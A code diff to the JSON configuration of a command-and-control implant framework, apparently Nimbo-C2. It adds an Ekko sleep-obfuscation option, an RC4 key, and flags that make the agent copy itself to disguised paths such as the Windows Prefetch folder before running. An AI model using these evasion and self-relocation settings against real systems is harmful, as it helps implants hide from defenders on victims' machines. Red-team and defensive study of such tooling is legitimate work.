@@ -19,12 +19,21 @@
         "call_home_jitter_percent": 1,
         // seconds to sleep after initial execution
         "sleep_on_execution": 0,
+        // sleep obfuscation technique
+        // 0 = none
+        // 1 = Ekko
+        "sleep_obfuscation_technique": 0,
+        // keep it 16 chars
+        "nekko_rc4_key": "Nimbo-C2     :-)",
         "exe":
         {
             // default exe filename - can be override (use build exe -h)
             "agent_filename": "na.exe",
             // path to be copied and executed from
-            "execution_path": "C:\\\\ProgramData\\\\Prefetch\\\\na.exe"
+            "execution_path": "C:\\\\ProgramData\\\\Prefetch\\\\na.exe",
+            // whether to copy and execute self to execution_path
+            // you may want to set this to false for reflective loading stuff
+            "reloc_on_exec": true
         },
         "dll":
         {
@@ -39,7 +48,9 @@
             // default elf filename - can be override (use build exe -h)
             "agent_filename": "na.elf",
             // path to be copied and executed from
-            "execution_path": "/tmp/metadata/na.elf"
+            "execution_path": "/tmp/metadata/na.elf",
+            // whether to copy and execute self to execution_path
+            "reloc_on_exec": true
         }
     },
     "communication":
